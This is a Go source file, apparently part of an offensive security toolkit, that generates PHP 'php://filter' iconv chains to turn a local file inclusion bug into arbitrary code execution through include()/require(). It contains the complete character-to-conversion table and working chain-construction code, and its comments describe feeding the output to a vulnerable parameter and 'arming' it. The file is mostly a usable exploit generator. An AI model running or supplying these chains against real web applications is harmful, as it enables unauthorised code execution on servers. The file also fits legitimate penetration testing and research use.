// Package phpfilter generates PHP filter chains that turn an LFI/file-read
// primitive into an arbitrary-content primitive against an include()/require()
// sink.
//
// The technique (loknop's research, popularised by synacktiv) abuses chained
// convert.iconv filters. Each base64 character of the desired payload maps to a
// fixed sequence of convert.iconv.<from>.<to> conversions that prepend that
// character to a working buffer; interleaved convert.base64-decode /
// convert.base64-encode steps keep the buffer valid base64, and
// convert.iconv.UTF8.UTF7 steps strip the '=' padding that would otherwise
// corrupt the chain. A final convert.base64-decode yields the raw payload
// bytes, which an include()/require() sink then executes.
//
// This package is a pure-Go payload *generator*: it emits the
// `php://filter/...|...|.../resource=<res>` string and performs no network I/O.
// The operator supplies the string to the vulnerable parameter. The conversion
// table is the published, verified set from synacktiv's
// php_filter_chain_generator (the de-facto reference implementation). Pure
// string construction keeps the package MIT-clean (no GPL deps).
package phpfilter

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
)

// defaultResource is the most portable sink: php://temp is always readable and
// has no dependency on guessing a valid filename on the target.
const defaultResource = "php://temp"

// conversions maps each base64 alphabet character to the iconv conversion
// sequence that prepends it to the working buffer. This table is the verified
// reference set from synacktiv's php_filter_chain_generator; the values are
// empirically derived against real PHP iconv behaviour and must not be edited
// without re-deriving against a live target. '=' maps to an empty string
// because padding is stripped via convert.iconv.UTF8.UTF7, never reconstructed.
var conversions = map[byte]string{
	'0': "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
	'1': "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
	'2': "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
	'3': "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
	'4': "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
	'5': "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
	'6': "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
	'7': "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
	'8': "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
	'9': "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
	'A': "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
	'a': "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
	'B': "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
	'b': "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
	'C': "convert.iconv.UTF8.CSISO2022KR",
	'c': "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
	'D': "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
	'd': "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
	'E': "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
	'e': "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
	'F': "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
	'f': "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
	'g': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
	'G': "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
	'H': "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
	'h': "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
	'I': "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
	'i': "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
	'J': "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
	'j': "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
	'K': "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
	'k': "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
	'L': "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
	'l': "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
	'M': "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
	'm': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
	'N': "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
	'n': "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
	'O': "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
	'o': "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
	'P': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
	'p': "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
	'q': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
	'Q': "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
	'R': "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
	'r': "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
	'S': "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
	's': "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
	'T': "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
	't': "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
	'U': "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
	'u': "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
	'V': "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
	'v': "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
	'W': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
	'w': "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
	'X': "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
	'x': "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
	'Y': "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
	'y': "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
	'Z': "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
	'z': "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
	'/': "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
	'+': "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
	'=': "",
}

// base64Char matches a single character of the standard base64 alphabet,
// including padding. Used to validate raw-base64 input.
var base64Char = regexp.MustCompile(`^[A-Za-z0-9+/=]*$`)

// Generate builds a PHP filter chain that reconstructs payload (an arbitrary
// byte string) when read through the chain against resource. The resource's
// original contents are irrelevant — the chain overwrites the buffer with the
// payload's base64 representation. When resource is empty, php://temp is used,
// which is the most portable choice (always readable, no path dependency).
//
// payload must be non-empty. The returned string is a single php://filter URI
// ready to feed to a vulnerable LFI parameter whose sink is include()/require().
func Generate(payload string, resource string) (string, error) {
	if len(payload) == 0 {
		return "", fmt.Errorf("phpfilter: payload must be non-empty")
	}
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	return generateFromBase64(b64, resource, true)
}

// GenerateFromBase64 builds a chain from a pre-encoded base64 string instead of
// raw payload bytes. This mirrors the reference generator's --rawbase64 mode and
// is useful for debugging: with decode=false the chain emits the reconstructed
// base64 (rather than the decoded bytes) so the operator can verify the chain
// against a target before arming it. b64 may include '=' padding.
func GenerateFromBase64(b64 string, resource string, decode bool) (string, error) {
	if !base64Char.MatchString(b64) {
		return "", fmt.Errorf("phpfilter: %q is not a valid base64 string", b64)
	}
	if strings.TrimRight(b64, "=") == "" {
		return "", fmt.Errorf("phpfilter: base64 input must be non-empty")
	}
	return generateFromBase64(b64, resource, decode)
}

// generateFromBase64 is the shared chain-construction core. It faithfully ports
// the synacktiv generate_filter_chain algorithm: seed garbage base64, strip
// padding, then for each base64 char (right-to-left) append its conversion plus
// a decode/encode/UTF7 cleanup group, and optionally finish with a decode.
func generateFromBase64(b64 string, resource string, decode bool) (string, error) {
	if resource == "" {
		resource = defaultResource
	}
	// Padding is never reconstructed; it is stripped by the UTF8.UTF7 steps.
	encoded := strings.TrimRight(b64, "=")

	var b strings.Builder
	// Seed: generate some garbage base64, then strip any '=' padding so the
	// working buffer starts in a clean, decodable state.
	b.WriteString("php://filter/")
	b.WriteString("convert.iconv.UTF8.CSISO2022KR|")
	b.WriteString("convert.base64-encode|")
	b.WriteString("convert.iconv.UTF8.UTF7|")

	// Build right-to-left so the buffer reads as the full base64 string.
	for i := len(encoded) - 1; i >= 0; i-- {
		c := encoded[i]
		conv, ok := conversions[c]
		if !ok {
			return "", fmt.Errorf("phpfilter: no iconv conversion for base64 char %q", string(c))
		}
		if conv != "" {
			b.WriteString(conv)
			b.WriteByte('|')
		}
		// Decode + reencode discards anything that isn't valid base64, then the
		// UTF7 step strips the resulting '=' padding.
		b.WriteString("convert.base64-decode|")
		b.WriteString("convert.base64-encode|")
		b.WriteString("convert.iconv.UTF8.UTF7|")
	}

	if decode {
		// Final decode yields the raw payload bytes for the include() sink.
		b.WriteString("convert.base64-decode")
	} else {
		// Debug mode: drop the trailing '|' so the chain is well-formed but the
		// buffer surfaces as base64 rather than decoded bytes.
		s := b.String()
		s = strings.TrimRight(s, "|")
		return s + "/resource=" + resource, nil
	}

	b.WriteString("/resource=")
	b.WriteString(resource)
	return b.String(), nil
}

// Chars returns the base64 alphabet characters for which a conversion exists
// (excluding '=' padding). Exposed for tests asserting full alphabet coverage.
func Chars() []byte {
	out := make([]byte, 0, len(conversions))
	for c := range conversions {
		if c == '=' {
			continue
		}
		out = append(out, c)
	}
	return out
}
